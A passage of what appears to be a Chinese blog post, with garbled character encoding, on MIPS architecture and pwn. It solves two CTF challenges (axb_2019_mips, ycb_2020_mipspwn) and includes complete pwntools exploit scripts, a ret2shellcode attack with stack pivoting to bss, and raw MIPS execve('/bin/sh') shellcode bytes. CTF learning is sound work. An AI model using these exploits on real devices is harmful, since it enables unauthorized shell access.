ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™æ˜¯å› ä¸º <code>MIPS</code> é‡‡ç”¨äº†é«˜åº¦çš„æµæ°´çº¿ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯è·³è½¬æŒ‡ä»¤å¯¼è‡´çš„<strong>åˆ†æ”¯å»¶è¿Ÿæ•ˆåº”</strong>ã€‚åœ¨åˆ†æ”¯è·³è½¬è¯­å¥åé¢é‚£æ¡è¯­å¥å«åš<strong>åˆ†æ”¯å»¶è¿Ÿæ§½</strong>ï¼Œå½“è·³è½¬è¯­å¥åˆšæ‰§è¡Œçš„ä¸€ç¬é—´ï¼Œè·³è½¬åˆ°çš„åœ°å€åˆšå¡«å……å¥½ï¼ˆå¡«å……åˆ°ç¨‹åºè®¡æ•°å™¨ï¼‰ï¼Œ<strong>è¿˜æ²¡æœ‰æ‰§è¡Œç¨‹åºè®¡æ•°å™¨ä¸­å­˜æ”¾çš„æŒ‡ä»¤ï¼Œåˆ†æ”¯å»¶è¿Ÿæ§½çš„æŒ‡ä»¤å·²ç»è¢«æ‰§è¡Œäº†ï¼Œè¿™å°±æ˜¯æµæ°´çº¿æ•ˆåº”</strong>ï¼ˆå‡ æ¡æŒ‡ä»¤è¢«åŒæ—¶æ‰§è¡Œï¼Œåªæ˜¯å¤„äºä¸åŒçš„é˜¶æ®µï¼Œ <strong><code>MIPS</code> ä¸åƒå…¶ä»–æ¶æ„é‚£æ ·å­˜åœ¨æµæ°´çº¿é˜»å¡</strong>ï¼‰ï¼Œä¸ºäº†é¿å…å‡ºç°é—®é¢˜ï¼Œå› æ­¤åœ¨åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡æŒ‡ä»¤é€šå¸¸æ˜¯ <code>nop</code> æŒ‡ä»¤æˆ–è€…å…¶ä»–æœ‰ç”¨çš„æŒ‡ä»¤ã€‚</p></li><li><p>ç¼“å­˜åˆ·æ–°æœºåˆ¶ï¼š<code>MIPS CPUs</code>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„ <code>cache</code> : <code>æŒ‡ä»¤cache</code> å’Œ <code>æ•°æ®cache</code> ã€‚ æŒ‡ä»¤å’Œæ•°æ®åˆ†åˆ«åœ¨ä¸¤ä¸ªä¸åŒçš„ç¼“å­˜ä¸­ã€‚å½“ç¼“å­˜æ»¡äº†ï¼Œä¼šè§¦å‘ <code>flush</code> , å°†æ•°æ®å†™å›åˆ°ä¸»å†…å­˜ã€‚æ”»å‡»è€…çš„æ”»å‡»<code>payload</code> é€šå¸¸ä¼šè¢«åº”ç”¨å½“åšæ•°æ®æ¥å¤„ç†ï¼Œå­˜å‚¨åœ¨æ•°æ®ç¼“å­˜ä¸­ã€‚å½“ <code>payload</code> è§¦å‘æ¼æ´ï¼Œ åŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹çš„æ—¶å€™ï¼Œä¼šå»æ‰§è¡Œå†…å­˜ä¸­çš„ <code>shellcode</code> .å¦‚æœæ•°æ®ç¼“å­˜æ²¡æœ‰è§¦å‘ <code>flush</code> çš„è¯ï¼Œ<code>shellcode</code> ä¾ç„¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œè€Œæ²¡æœ‰å†™å…¥ä¸»å†…å­˜ã€‚è¿™ä¼šå¯¼è‡´ç¨‹åºæ‰§è¡Œäº†æœ¬è¯¥å­˜å‚¨ <code>shellcode</code> çš„åœ°å€å¤„éšæœºçš„ä»£ç ï¼Œå¯¼è‡´ä¸å¯é¢„çŸ¥çš„åæœã€‚(é€šå¸¸æ‰§è¡Œ <code>sleep(1)</code> åˆ·æ–°)</p></li></ul><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305102022075.png" alt="image-20230510202231987"></p><h3 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305110732606.png" alt="image-20230511073238845" style="zoom:50%;" /><p>å‡½æ•°è°ƒç”¨æ—¶ä¼ å‚ï¼šå¦‚æœå‡½æ•°çš„å‚æ•°å°äºç­‰äºå››ä¸ªï¼Œé‚£ä¹ˆä¼šä½¿ç”¨ <code>$a0 ~ $a3</code> å¯„å­˜å™¨æ¥å­˜æ”¾å‚æ•°ã€‚å¦‚æœå‚æ•°å¤šäºå››ä¸ªï¼Œé‚£ä¹ˆå¤šäºçš„å‚æ•°åˆ™å­˜æ”¾åˆ°æ ˆé‡Œï¼ˆåŒæ—¶ä¹Ÿä¼šé¢„ç•™å‡ºå‰å››ä¸ªå‚æ•°çš„å†…å­˜ç©ºé—´ï¼Œå› ä¸ºè¢«è°ƒç”¨è€…ä½¿ç”¨å‰å››ä¸ªå‚æ•°æ—¶ï¼Œä¼šç»Ÿä¸€å°†å‚æ•°æ”¾åˆ°ä¿ç•™çš„æ ˆç©ºé—´ï¼‰ï¼Œå…·ä½“æƒ…å†µæ˜¯å‡½æ•° <code>A</code> è°ƒç”¨å‡½æ•° <code>B</code> ï¼Œè°ƒç”¨è€…å‡½æ•°ï¼ˆå‡½æ•°<code>A</code> ï¼‰ä¼šåœ¨è‡ªå·±çš„æ ˆé¡¶é¢„ç•™ä¸€éƒ¨åˆ†ç©ºé—´æ¥ä¿å­˜è¢«è°ƒç”¨è€…ï¼ˆå‡½æ•° <code>B</code> ï¼‰çš„å‚æ•°ï¼Œç§°ä¹‹ä¸ºè°ƒç”¨å‚æ•°ç©ºé—´ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092258483.png" alt="image-20230509225831965" style="zoom:50%;" /><p>å‡½æ•° <code>A</code> è°ƒç”¨å‡½æ•° <code>B</code>ã€‚å¦‚æœ <code>B</code> æ˜¯å¶å­å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨ <code>B</code> å‡½æ•°æ—¶ï¼Œä¼šå°† <code>B</code> å‡½æ•°çš„è¿”å›åœ°å€å­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ï¼›å¦‚æœ <code>B</code> æ˜¯éå¶å­å‡½æ•°ï¼ˆ<code>B</code> å‡½æ•°å†…éƒ¨è°ƒç”¨äº†ä¸€ä¸ª <code>C</code> å‡½æ•°ï¼‰ï¼Œé‚£ä¹ˆåœ¨è·³è½¬åˆ° <code>B</code> å‡½æ•°æ—¶ï¼Œä¼šå°†å…¶è¿”å›åœ°å€å…ˆå­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ä¸­ï¼Œéšååœ¨ <code>B</code> å‡½æ•°å†…éƒ¨å†å°† <code>$ra</code> å¯„å­˜å™¨çš„å€¼å­˜å…¥æ ˆä¸­ï¼ˆä½äº <code>fp-0x4</code> çš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾ï¼‰ã€‚å½“ <code>B</code> å‡½æ•°è°ƒç”¨ <code>C</code> å‡½æ•°æ—¶ï¼Œä¼šå°†å…¶è¿”å›åœ°å€å­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ï¼Œåœ¨è¿”å›æ—¶æ‰§è¡Œ <code>jr $ra</code> æŒ‡ä»¤å›åˆ° <code>B</code> å‡½æ•°ã€‚ç°åœ¨å‡è®¾ <code>B</code> å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•å‡†å¤‡è¿”å›åˆ° <code>A</code> å‡½æ•°ï¼Œä¼šå°†åŸå…ˆå­˜å…¥æ ˆé‡Œçš„è¿”å›åœ°å€è¯»åˆ° <code>$ra</code> å¯„å­˜å™¨ä¸­ï¼Œæœ€åæ‰§è¡Œ <code>jr $ra</code> æŒ‡ä»¤ï¼Œå›åˆ° <code>A</code> å‡½æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092257102.png" alt="image-20230509225747069" style="zoom:50%;" /><h3 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><h5 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112102666.png" alt="image-20230511210201613"></p><p>å‘ç°ä¿æŠ¤å…¨å…³ï¼Œå¹¶ä¸”æ˜¯å°ç«¯åº</p><h5 id="è§£å†³æŠ¥é”™"><a href="#è§£å†³æŠ¥é”™" class="headerlink" title="è§£å†³æŠ¥é”™"></a>è§£å†³æŠ¥é”™</h5><p>å°è¯•ç”¨ <code>qemu-mipsel ./pwn2</code> è¿è¡Œæ—¶å‘ç°å¦‚ä¸‹æŠ¥é”™</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel: Could not open &#x27;/lib/ld-uClibc.so.0&#x27;: No such file or directory</span><br></pre></td></tr></table></figure><p>è¿™è¡¨æ˜åœ¨ <code>/lib</code> ç›®å½•ä¸‹ç¼ºå°‘ <code>ld-uClibc.so.0</code> æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>file pwn2</code> æ¥æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112045280.png" alt="image-20230511204507118"></p><p>å‘ç°åŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„æ˜¯ <code>/lib/ld-uClibc.so.0</code> ï¼Œè€Œåœ¨è¿™ä¸ªä½ç½®æ²¡æœ‰æ‰¾åˆ° <code>ld-uClibc.so.0</code> ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>sudo find / -name &quot;ld-uClibc.so.0&quot; 2&gt;/dev/null</code> å‘½ä»¤æœç´¢ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æœ‰è¿™ä¸ª  <code>ld-uClibc.so.0</code> æ–‡ä»¶çš„ï¼Œåªä¸è¿‡ä¸åœ¨ <code>/lib</code> ç›®å½•ä¸‹ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112049318.png" alt="image-20230511204913250"></p><p>å› æ­¤åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥è¿‡å»å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/ld-uClibc.so.0 /lib/</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°è¯•å†æ¬¡è¿è¡Œ <code>pwn2</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel ./pwn2                                   </span><br><span class="line">./pwn2: can&#x27;t load library &#x27;libc.so.0&#x27;</span><br></pre></td></tr></table></figure><p>è¿™è¡¨æ˜ç°åœ¨è¿˜ç¼ºå°‘ä¸€ä¸ª <code>libc.so.0</code> çš„åº“ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>ls /home/zikh/Desktop/mipsel-linux-uclibc/lib/</code> å‘½ä»¤ï¼Œå‘ç°æ˜¯æœ‰ <code>libc.so.0</code> è¿™ä¸ªåº“çš„ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112028607.png" alt="image-20230511202846472"></p><p>å› æ­¤æˆ‘ä»¬ä¾ç„¶ç»™è½¯é“¾æ¥åˆ° <code>/lib</code> ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/libc.so.0 /lib/ </span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç¨‹åºå¯ä»¥è¿è¡ŒæˆåŠŸï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112030731.png" alt="image-20230511203036662" style="zoom:50%;" /><h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112143512.png" alt="image-20230511214356466" style="zoom:50%;" /><p>é¦–å…ˆè¿™é‡Œæœ‰ä¸€ä¸ª <code>read</code> è¾“å…¥ï¼Œéšå <code>printf</code> å‡½æ•°æ˜¯ä½¿ç”¨äº† <code>%s</code> å°†æ•°æ®è¿›è¡Œæ‰“å°ï¼Œåœ¨è¿™é‡Œæ€€ç–‘å¯èƒ½æœ‰æœºä¼šæ³„éœ²ä¸€äº›æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112146239.png" alt="image-20230511214644840"></p><p>å‘ç°å†™å…¥ <code>0x14</code> å­—èŠ‚çš„æ•°æ®ï¼Œç¡®å®å¯ä»¥é¡ºå¸¦æ‰“å°å‡ºæ¥ä¸€ä¸ªæ ˆåœ°å€</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112147526.png" alt="image-20230511214754487"></p><p>éšåå‘ç° <code>vuln</code> å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼ˆå¦‚ä¸Šï¼‰</p><h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>å› ä¸ºæœ‰äº†æ ˆåœ°å€ï¼Œå¹¶ä¸”æ ˆåŒºæ˜¯æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œæ‰€ä»¥æ‰“ä¸€ä¸ªå¸¸è§„çš„ <code>ret2shellcode</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120729296.png" alt="image-20230512072926146"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå‘ç°æœ¬åœ°æ˜¯é€šäº†çš„ï¼Œå› æ­¤æ€è·¯æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œ<code>EXP</code> å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25419)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*offset)</span><br><span class="line">stack_addr=u32(p.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x24</span>+p32(stack_addr-<span class="number">0x50</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()            </span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œåœ¨æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œæ˜æ˜¾å‘ç°æ³„éœ²å‡ºæ¥çš„å¹¶ä¸æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼ˆå› ä¸ºæœ¬åœ°å’Œè¿œç¨‹çš„ç¯å¢ƒä¸åŒï¼Œå¦‚ä¸‹å›¾ï¼‰ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ‰“è¿œç¨‹æ˜¯è¡Œä¸é€šçš„</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120725360.png" alt="image-20230512072536085"></p><p>å¦‚æœä¸æ³„éœ²æ ˆåœ°å€çš„è¯ï¼Œæˆ‘ä»¬è€ƒè™‘å¯ä»¥æ ˆè¿ç§»åˆ° <code>bss</code> æ®µä¸Šï¼Œå¹¶ä¸”å¾€ <code>bss</code> æ®µå†™å…¥ <code>shellcode</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122036129.png" alt="image-20230512203620008"></p><p>é€šè¿‡åˆ†æä¸Šé¢çš„æ±‡ç¼–å‘ç°ï¼Œ <code>read</code> çš„ç¬¬äºŒä¸ªå‚æ•° <code>$a1</code> ç”± <code>fp</code> æ§åˆ¶ï¼Œè€Œé€šè¿‡é˜…è¯» <code>read</code> å‡½æ•°åçš„æ±‡ç¼–ä»£ç ï¼Œå­˜åœ¨ä¸€å¥ <code>lw    $fp, 0x38($sp)</code> ï¼Œåˆå› ä¸ºæ­¤å¤„æœ‰æ ˆæº¢å‡ºï¼Œç›¸å½“äºæˆ‘ä»¬æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šã€‚æˆ‘ä»¬é€‰æ‹©å¾€ <code>bss</code> æ®µå†™å…¥ <code>shellcode</code> ï¼Œç„¶åå¯»æ‰¾è¿ç§»çš„æœºä¼šï¼Œè¿ç§»åˆ° <code>bss</code> æ®µçš„ <code>shellcode</code> æ‰§è¡Œã€‚</p><p>æ‰§è¡Œå®Œç¨‹åºåŸæœ¬çš„ <code>read</code> å‡½æ•°åï¼Œæœ‰ä¸€å¥ <code>lw   $ra,0x3c($sp)</code> çš„æ±‡ç¼–ï¼Œæˆ‘ä»¬å°†è·ç¦»æ ˆé¡¶ <code>0x3c</code> çš„ä½ç½®æ”¾æˆä¸Šé¢æåˆ°çš„ <code>lw   $fp,0x38($sp)</code> æŒ‡ä»¤åœ°å€ï¼Œä»¥æ­¤è·³è½¬è¿‡å»</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122116335.png" alt="image-20230512211611122"></p><p>ä¸‹å›¾ä¸ºå‘ <code>bss</code> æ®µå†™å…¥æ•°æ®çš„ <code>read</code> å‡½æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122119885.png" alt="image-20230512211952663" style="zoom:50%;" /><p>å½“ <code>read</code> å¾€ <code>bss</code> æ®µè¯»å…¥å®Œæ•°æ®åï¼Œæ‰§è¡Œäº† <code>mov   $sp,$fp</code> ï¼Œæ­¤æ—¶æ ˆè¿›è¡Œäº†è¿ç§»ï¼ˆ<code>fp</code> æ˜¯æœ€åˆæ§åˆ¶çš„é‚£ä¸ª <code>bss</code> æ®µåœ°å€ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122118517.png" alt="image-20230512211852230"></p><p>éšåä¸‹ä¸€æ¡æŒ‡ä»¤ <code>lw   $ra,0x3c($sp)</code> å°† <code>$ra</code> çš„å€¼å†æ¬¡è¿›è¡Œäº†è®¾ç½®ï¼Œå› ä¸º <code>$sp</code> æ˜¯å¯æ§çš„ <code>bss</code> æ®µåœ°å€ï¼Œæ‰€ä»¥ <code>$ra</code> ä¾ç„¶å¯æ§ï¼Œæˆ‘ä»¬å°† <code>$ra</code> è®¾ç½®ä¸º <code>shellcode</code> çš„èµ·å§‹åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122127368.png" alt="image-20230512212720766"></p><p>ä½†æˆå‰§çš„æ˜¯ï¼Œè¿™ç§æ‰“æ³•å¯¼è‡´äº†è¿œç¨‹é€šäº†ï¼Œæœ¬åœ°æ²¡é€šã€‚å› ä¸ºæœ¬é¢˜ç¯å¢ƒçš„åŸå› ï¼Œ<code>bss</code> æ®µæ˜¯æ²¡æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼Œè€Œè¿œç¨‹çš„ <code>bss</code> æ®µæ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„ã€‚</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, word_size=32,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25115</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x410ba0</span></span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x20</span>+p32(bss_addr)+p32(<span class="number">0x4007E4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x410be0</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122131912.png" alt="image-20230512213146674"></p><h4 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h4><h5 id="ä¿æŠ¤ç­–ç•¥-1"><a href="#ä¿æŠ¤ç­–ç•¥-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142040351.png" alt="image-20230514204013277"></p><h5 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>æœ¬é¢˜ä¸ä¸Šä¸€é“çš„æ¼æ´ä¸€æ ·ï¼ŒåŒæ ·æ˜¯æ ˆæº¢å‡ºã€‚</p><p>é‡‡ç”¨çš„ç­–ç•¥æ˜¯æ‰“ <code>ret2shellcode</code></p><p>åªä¸è¿‡æœ¬é¢˜çš„ <code>shellcode</code> æ˜¯æ‰‹å†™çš„ <a href="#shellcode%E7%BC%96%E5%86%99">å¦‚ä½•ç¼–å†™MIPSæ¶æ„ä¸‹çš„ shellcode</a> </p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29366</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Warrior,leave your name here:\n&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x4115F0</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Write down your feeling:\n&quot;</span>,<span class="number">0x38</span>*<span class="string">b&#x27;b&#x27;</span>+p32(bss_addr)+p32(<span class="number">0x400F54</span>))</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(<span class="number">0x411648</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142045142.png" alt="image-20230514204550938"></p><h3 id="shellcodeç¼–å†™"><a href="#shellcodeç¼–å†™" class="headerlink" title="shellcodeç¼–å†™"></a>shellcodeç¼–å†™</h3><h4 id="write-ç³»ç»Ÿè°ƒç”¨"><a href="#write-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="write ç³»ç»Ÿè°ƒç”¨"></a><code>write</code> ç³»ç»Ÿè°ƒç”¨</h4><p>æˆ‘ä»¬å…ˆå»å°è¯•ç¼–å†™ä¸€æ®µèƒ½å¤Ÿè¾“å‡º <code>ABC\n</code> å­—ç¬¦ä¸²çš„ <code>shellcode</code></p><p>åˆ›å»º <code>write.s</code> æ–‡ä»¶ï¼Œå°†ä¸‹é¢çš„æ±‡ç¼–ä»£ç å†™å…¥æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,0($sp)</span><br><span class="line">li $a0,1</span><br><span class="line">addiu $a1,$sp,0</span><br><span class="line">li $a2,5</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p> <code>.section .text</code> æŒ‡å®šäº†è¯¥æ®µä»£ç æ‰€åœ¨çš„èŠ‚</p><p> <code>.globl __start</code> è¡¨ç¤ºå°† <code>__start</code> å¯¼å‡ºä¸ºå…¨å±€ç¬¦å·ï¼ˆ <code>Global Symbol</code> ï¼‰ã€‚åœ¨Cè¯­è¨€ç¼–å†™çš„ç¨‹åºä¸­ï¼Œç¨‹åºçš„å…¥å£ç‚¹é€šå¸¸è¢«å‘½åä¸º <code>_start</code>ï¼Œè€Œåœ¨æ±‡ç¼–ä»£ç ä¸­é€šå¸¸ä½¿ç”¨ <code>__start</code></p><p> <code>.set noreorder</code> ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œç¡®ä¿æ±‡ç¼–ä»£ç çš„æ‰§è¡Œé¡ºåºä¸æºä»£ç ä¸­æŒ‡å®šçš„é¡ºåºä¸€è‡´ã€‚æŒ‡ä»¤é‡æ’æ˜¯ç¼–è¯‘å™¨å’Œå¤„ç†å™¨åœ¨ä¼˜åŒ–ä»£ç æ‰§è¡Œé€Ÿåº¦æ—¶é‡‡ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå®ƒå¯ä»¥æ”¹å˜æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºï¼Œä»¥ä¾¿åœ¨ä¸å½±å“ç¨‹åºé€»è¾‘çš„æƒ…å†µä¸‹æé«˜ä»£ç æ‰§è¡Œæ•ˆç‡ã€‚</p><p><code>__start:</code> æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ç¬¦å·ï¼Œåœ¨ç¨‹åºæ‰§è¡Œæ—¶å°†ä»è¿™é‡Œå¼€å§‹æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p><code>addiu $sp,$sp,-32</code> å°†å¼€è¾Ÿä¸€ä¸ª <code>0x20</code> å¤§å°çš„æ ˆå¸§</p><p><code>lui $t6,0x4142</code> æ˜¯å°† 